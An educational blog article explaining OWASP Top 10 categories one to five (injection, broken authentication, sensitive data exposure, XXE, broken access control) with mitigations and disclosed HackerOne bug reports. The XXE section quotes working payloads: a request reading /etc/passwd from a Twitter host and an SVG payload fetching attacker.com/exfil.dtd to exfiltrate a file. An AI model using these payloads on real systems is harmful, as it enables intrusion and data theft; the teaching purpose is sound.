---
id: owasp
title: Owasp
sidebar_label: Owasp
---

When it comes to web application testing, there’s arguably no better reference guide than the  [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project). Based on a large number of data sets and opinions surveyed from a plethora of industry professionals, it ranks the ten most severe security weaknesses in web applications. This format makes it a great go-to reference for web application security, helping to address frequently occurring vulnerabilities by also offering mitigation steps for each identified vulnerability type.

![](https://miro.medium.com/v2/resize:fit:840/1*s2-ddrAPJuC32e5174CJjg.png)

Given the huge amount of time invested into producing the OWASP Top 10, it isn’t an annual document. There have been three released in this decade —  [2010](https://www.owasp.org/images/6/67/OWASP_AppSec_Research_2010_OWASP_Top_10_by_Wichers.pdf),  [2013](https://www.owasp.org/images/f/f8/OWASP_Top_10_-_2013.pdf)  and  [2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)  — and this breathing time between releases also helps to highlight how the trends of different web app vulnerabilities evolve (or in some cases, don’t!) over time.

In this first article in a two-part series, we’ll give a simple overview of the first five vulnerabilities listed in the OWASP Top 10, how to mitigate them, as well as featuring real-world examples from disclosed bug reports to show the exploits in action. Let’s get into it!

# 1. Injection

![](https://miro.medium.com/v2/resize:fit:768/0*gfCmOO0jI6bSxEkC.jpg)

## What is it?

Topping the list for the third time in a row, an injection vulnerability is when an attacker sends  _malicious data_ as part of a command or query to an interpreter. If successful, this malicious input will be executed as code, causing the interpreter to execute unintended commands or reveal data which should otherwise be inaccessible.

## When Does it Happen?

Ultimately, the most common cause of injection vulnerabilities results from an application’s failure to  **filter**,  **validate**  or  **sanitise**  user input. Websites will always be presented with the following predicament: if user input is required for the application to function as intended, there will always be malicious users who attempt to exploit this by sending unexpected or unintended data.

The other major cause of injection attacks is due to a failure to implement parameterisation (we’ll talk more about this in the following section). Particularly vulnerable queries or commands are those which concatenate user input directly into the call, allowing an attacker to alter its intended function via malicious inputs.

## **How to Mitigate Injection Attacks**

1.  Filtering, Validating, Encoding and Escaping

-   Deny list: the process of rejecting/stripping known ‘bad’ input. However, this has limitations, since you’re essentially always fighting an uphill battle against attackers with this method of mitigation. Let’s say a developer strips any user input containing  `"`  or  `'`  as a means of preventing query alteration. An attacker  _may_ be able to URL encode these characters to  `%22`  or  `%27`  in order to circumvent this deny listing. For this reason, depending on a list of denied inputs is never going to be an effective mitigation method when used  _alone_.
-   Allow list: the process of only accepting desired input. In the case of an e-mail address, this may have certain restrictions such as requiring an  `@`  symbol or a  `.`. In practice though, this can become difficult to implement in web apps where the intended function by design should allow the user to input a broad range of characters — such as a job-posting website.
-   Encoding: the process of encoding ‘dangerous’ characters after they have been submitted by the user to make them harmless. The most common example of this is by using  [HTML entity encoding,](https://www.w3schools.com/html/html_entities.asp)  whereby characters such as  `'`  and  `"`  would become  `&apos;`  and  `&quot;`  respectively.
-   Escaping: the process of ‘escaping’ special characters to ensure they are interpreted as string literals rather than functioning as special characters. Typically this is done with backslashes but varies depending upon the language at play.

A combination of some or all of the above would be a recommended starting step to preventing injection attacks.

2. Query Parameterisation

As  [recommended by OWASP,](https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet)  using parameterised queries is the best — and cleanest — way to mitigate SQL injection attacks (in combination with the aforementioned mitigation steps). It is a query whereby only the parameters are supplied at execution, heavily reducing the ability for a determined attacker to alter or ‘break’ the query itself. Below is a simple example of a parameterised query from W3’s  [page on SQLi](https://www.w3schools.com/sql/sql_injection.asp):

![](https://miro.medium.com/v2/resize:fit:840/1*qCcWjlVtG7SF14bberf54Q.png)

For more information on preventing injection attacks, check out the following OWASP cheat sheets:  [Injection Prevention Cheat Sheet](https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet)  &  [SQL Injection Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet).

## Real-World Examples

Valve paid out $25,000 after an SQL injection was reported in  `report_xml.php` through  `countryFilter[]`  parameter ([view public disclosure on HackerOne](https://hackerone.com/reports/383127)).

1.  SQL injection due to controllable  `$conversationID`  parameter (exploit is described in detail with relevant source code via the  [public disclosure on HackerOne](https://hackerone.com/reports/358570)).
2.  Another SQL injection — this time in a WordPress plugin called Formidable Pro which was used by tech company Grab. Earning a $4,500 payout, the  [initial report](https://hackerone.com/reports/273946)  posted by the security researcher was extremely detailed and worth looking at for getting a closer look at advanced  `[sqlmap](https://github.com/sqlmapproject/sqlmap)`  usage.

# 2. Broken Authentication

![](https://miro.medium.com/v2/resize:fit:388/0*U7wYn__TFZ0p49_s.png)

## What is it?

This class of vulnerability covers any weaknesses in the authentication/session management methodology. These are often poorly implemented in web apps, giving attackers access to account(s) and/or data that they otherwise shouldn’t be authorised to view.

## When Does it Happen?

There are a variety of contributing factors to broken authentication, including:

-   Failure to deny automated attacks (brute-forcing, credential stuffing etc).
-   Allows users to have weak or well-known passwords such as  `password123`.
-   Exposes username/password information based on error messages/response times.
-   Implements weak credential recovery and forgotten-password measures. (An interesting article on the weak nature of security questions was  [published by the NCSC here](https://www.ncsc.gov.uk/blog-post/are-security-questions-leaving-gap-your-security)).
-   Exposes session IDs in URLs.
-   Fails to implement session ID switching after a user logs in.
-   Sessions remain active for too long — after a session has exited and remained inactive for a significant period of time.

## How to Mitigate Broken Authentication

The good news regarding broken authentication is that it can be significantly improved with just a couple of changes. The biggest of these are:

-   Two-factor authentication (or 2FA) for all logins. This prevents accounts from being brute-forced so easily.
-   Ensuring users have sufficiently-strong passwords by implementing validation on password creation. Requirements such as a minimum password length, mandatory complexity and denying the setting of common passwords/patterns is a good way to improve users’ account security.

There are numerous other steps that can be taken to further reduce the likelihood of broken authentication issues arising:

-   Rate-limit login attempts. While this is usually done via tracking cookies or IP addresses which a determined attacker may be able to bypass, it’s still another hurdle which will help prevent exploitation.
-   In the same way, a response delay (e.g. using a  `sleep`  function) can be implemented to further slow an attacker’s brute-force attempts.
-   Deny IP addresses from which suspicious activity has been detected.
-   Cross-reference user passwords against recent/common password leaks from other data breaches, and notify any users which are making use of passwords which are frequently applied in brute-force attempts.
-   Make use of a server-side, built-in session manager which generates a random, high-entropy session ID after a user has logged in. don’t ever include this ID in URLs and ensure that it is invalidated after a period of inactivity.

## Real-World Examples

1.  Uber failed to rate-limit the  [https://biz.uber.com/confirm](https://biz.uber.com/rate-limit)  endpoint, which would allow an attacker to brute-force business accounts and take rides on behalf of them. This vulnerability was identified and reported on HackerOne — the public disclosure can be  [viewed here](https://hackerone.com/reports/281344).
2.  Erroneous logic in Shopify’s web app meant that an attacker could be granted ‘collaborator’ access to any shop without authentication. This could be exploited by creating two partner accounts which shared the same business e-mail, giving an attacker login access to any store with full permissions. Deservedly paying a large reward ($20,000), the public disclosure can be viewed  [here](https://hackerone.com/reports/270981).

# 3. Sensitive Data Exposure

![](https://miro.medium.com/v2/resize:fit:388/0*QxsFDic3eIXvECPs.png)

## What is it?

As the name indicates, this vulnerability is when a web application fails to sufficiently protect sensitive data — namely personally identifiable information — which includes (but is not limited to) data points like e-mail addresses, postal addresses, banking information, dates of birth and telephone numbers.

## When Does it Happen?

While recent legal changes such as  [GDPR](https://en.wikipedia.org/wiki/General_Data_Protection_Regulation)  and the longstanding  [PCI DSS](https://en.wikipedia.org/wiki/Payment_Card_Industry_Data_Security_Standard)  should serve to mitigate likelihood of sensitive data being exposed, a significant percentage of web applications fail to meet these requirements. Sites are particularly at risk if:

-   Data is transmitted in clear text (over protocols such as HTTP, FTP and SMTP).
-   Sensitive data is stored server-side in clear text.
-   Known-to-be-weak cryptographic algorithms such as MD5 or SHA-1 are used for encryption.
-   Default/weak cryptographic keys are used.

## How to Mitigate Sensitive Data Exposure Attacks

It’s worth stressing that when it comes to sensitive data, the following mitigation steps should be followed  _at a minimum._ After all, most attackers are prioritising sensitive data as a target when it comes to exploiting vulnerabilities given how lucrative of a market it is on the dark web.

-   Identify all data which could be considered ‘sensitive’. Note where and how it is stored, as well as if and how it is transferred.
-   Do not store sensitive data which is no longer needed.
-   Use tokenisation for sensitive financial data (you can read more about this and its relation to PCI DSS compliance  [here](https://www.securitymetrics.com/blog/what-tokenization-and-how-can-i-use-it-pci-dss-compliance)).
-   Make sure that all stored sensitive data is encrypted with strong algorithms using cryptographic keys which have not been generated using standard/default passwords.
-   Ensure data which is transmitted uses TLS, perfect forward secrecy (PFS) ciphers, as well as implementing directives like HTTP Strict Transport Security where applicable. NCSC offers good guidance on recommended  [TLS configurations here](https://www.ncsc.gov.uk/guidance/using-tls-to-protect-data).
-   Store passwords using strong salted hashing functions (Argon2, scrypt, bcrypt and PBKDF2 are all secure).

## Real-World Examples

1.  Login form on non-HTTP page in one of Chaturbate’s assets allows for a Man-in-the-Middle (MITM) attack where user credentials can be intercepted by an eavesdropping user. The publicly disclosed report can be viewed on HackerOne  [here](https://hackerone.com/reports/386735).
2.  Secure flag is not included for Session Cookie at git.edoverflow.com, meaning that the browser will send it via an unencrypted channel (HTTP) if such a request is made which in turn could be eavesdropped and intercepted by an attacker. More info about securing cookies can be found in this  [good blog post,](https://blog.dareboost.com/en/2016/12/secure-cookies-secure-httponly-flags/)  while the original report can be viewed on HackerOne  [here](https://hackerone.com/reports/345166).

# 4. XML External Entities (XXE)

![](https://miro.medium.com/v2/resize:fit:840/0*lLS4R9FbxCDefWq2.png)

## What is it?

Annoyingly named XXE instead of XEE (but that’s besides the point here), XML External Entity attacks can exploit badly-configured XML processors to read internal files (as portrayed above), file shares and even be leveraged for remote code execution and DoS attacks. In the context of XML, an Entity is a mechanism to define replacement values; think of it like a variable which you define in a script. They can either be internally declared, like so:

```htm
_Syntax_

<!ENTITY entity-name “entity-value”>

_Example_

 <!ENTITY writer “George”>  
 <!ENTITY copyright “Medium”> XML example: <author>&writer;&copyright;</author>

Or externally declared which references a URI/URL, with slightly different syntax:

_Syntax_

<!ENTITY entity-name SYSTEM “URI/URL”>

_Example_

<!ENTITY writer SYSTEM “https://www.somewebsite.com/entities.dtd">  
 <!ENTITY copyright SYSTEM “https://www.somewebsite.com/entities.dtd"> XML example: <author>&writer;&copyright;</author>
```

Since XXE exploits external Entities only, the syntax you should be most aware of is the second example provided.

## When Does it Happen?

Web apps and XML-based web services can be vulnerable to an attack when if one or more of the conditions are present:

-   The web app accepts XML or allows for XML uploads — particularly with no validation for the source of the request — which is then parsed by an XML processor.
-   If DTDs (document type definitions) are enabled.
-   If the app uses SAML, since this relies upon XML for identity assertions.
-   SOAP version <1.2 are likely vulnerable if XML entities are passed directly to the framework.

## How to Mitigate XXE Exploitation

As the OWASP Top 10 affirms, ‘_developer training is essential to identify and mitigate XXE’._ Ensuring that web developers write security-conscious code is obviously the ideal way to prevent vulnerable apps, but this isn’t going to happen in practice. For this reason, other mitigation methods are suggested, including:

-   Disable XML external entity and DTD processing in XML parser(s).
-   Use another data format such as JSON instead of XML.
-   Avoid serialisation of sensitive data.
-   Don’t run old XML processors or libraries — and the same applies for SOAP. Ensure all versions are upgraded to the latest stable release.
-   Impose appropriate server-side filtering on XML documents to remove the presence of malicious code (using methods described in the ‘Injection’ section of this article).
-   Run Static Application Security Testing programs over relevant code to identify potential vulnerabilities.

## Real-World Examples

1.  Proving its prevalence as number 4 on the OWASP Top 10, an XXE vulnerability was discovered in Twitter of all sites. The exploit was remarkably simple — but paid out a whopping $10,080 due to its severity in allowing an attacker to read local files on the target system. Below is the POST request sent by the attacker, containing an XML payload which then returns the contents of the  `/etc/passwd`  file on the system:

```htm
POST /api/sxmp/1.0 HTTP/1.1  
Host: sms-be-vip.twitter.com  
Connection: close  
Content-Type: text/xml  
Content-Length: 481  
  
<?xml version="1.0" encoding="ISO-8859-1"?>  
<!DOCTYPE foo [    
   <!ELEMENT foo ANY >  
   <!ENTITY file SYSTEM "file:///etc/passwd">   
]>  
<operation type="deliver">  
<account username="abc" password="a"/>  
<deliverRequest referenceId="MYREF102020022">  
<operatorId>&file;</operatorId>  
<sourceAddress type="network">40404</sourceAddress>  
<destinationAddress type="international">123</destinationAddress>  
<text encoding="ISO-8859-1">a</text>  
</deliverRequest>  
</operation>  
</code>
```

_Response from server:_

```htm
<?xml version="1.0"?>  
<operation type="deliver">  
  <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/>  
</operation>
```

You can view the full publicised report on HackerOne  [here](https://hackerone.com/reports/248668).

2. Disclosed back in 2018, an XXE vulnerability led to an exploit in Rockstar Games’ emblem editor. The  [publicly disclosed report](https://hackerone.com/reports/347139)  includes code snippets and explanations from the researcher himself, so would thoroughly recommend checking it out. The basic XXE usage for the exploit can be seen below:

```htm
<!DOCTYPE svg [  
<!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">  
%outside;  
]>  
<svg>  
<defs>  
<pattern id="exploit">  
  <text x="10" y="10">  
    &exfil;  
  </text>  
</pattern>  
</defs>  
</svg>

_Contents of exfil.dtd:_

<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">  
<!ENTITY exfil "%data;">

```
# 5. Broken Access Control

![](https://miro.medium.com/v2/resize:fit:620/1*N_IwQuklGCyjAdpO5fNRSg.png)

## What is it?

Not to be confused with the similar-sounding Broken Authentication, Broken Access Control is when permission misconfigurations allow attackers to access or modify data/files/accounts that they should otherwise be unable to access.

## When Does it Happen?

In a web application where proper access control is enforced, users will have different access permissions based upon their granted privileges. However, these controls can be mistakenly misconfigured. Common vulnerabilities in this area can sprout from:

-   The ability to bypass access control checks via URL or HTML tampering, modification of the internal application’s state or by using a custom API attack tool.
-   A privilege escalation vulnerability, which allows a low-privileged user to perform actions that should be reserved for users with higher privileges.
-   Metadata manipulation (this includes vectors such as tampering with access control tokens such as JWTs or cookies).
-   CORS misconfigurations (you can learn more about these types of vulnerabilities in  [this blog post](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)).

## How to Mitigate Broken Access Control

There is one simple rule to keep in mind when managing access control: unless the resources  _must_ be publicly accessible, deny users from accessing them. Obviously this is easier said than done, particularly given the list of various attack vectors presented above. For this reason, there are some other pointers to mitigate any potential issues:

-   Minimise CORS implementation.
-   Prevent web server directory listing and ensure file metadata (such as .git) and backed-up files are not accessible via the server’s root directory. The .git vulnerability is particularly worth mentioning, since there are some scraping tools out there which identify exposed .git directories on inputted sites and download the source code. These tools can be viewed at internetwache’s  [GitTools repository here](https://github.com/internetwache/GitTools).
-   Log activity for the access of relevant files to document and identify any potential vulnerabilities in your own server.
-   Impose rate-limiting on API and controller access to reduce the potential harm from automated attack tools.
-   All relevant access tokens should be invalidated server-side when a user logs out.

## Real-World Examples

We’ve got two critical ones here — both related to the video game industry!

1.  Improper access control led to a security researcher being able to get the CD keys for  _any game_ on Steam. Definitely not intended privileges there. Valve summarised the exploit:

‘Using the /partnercdkeys/assignkeys/ endpoint on partner.steamgames.com with specific parameters, an authenticated user could download previously-generated CD keys for a game which they would not normally have access.’

2. An exposed  `.bash_history`  file on  [http://drivers.razersupport.com](http://drivers.razersupport.com/)  meant that any visitor to this endpoint could publicly view the file (see the report summary  [here](https://hackerone.com/reports/293470)). According to Razer:

‘When a DB admin eventually executed a command involving clear text credentials for the database, this exposed the password for that database.’
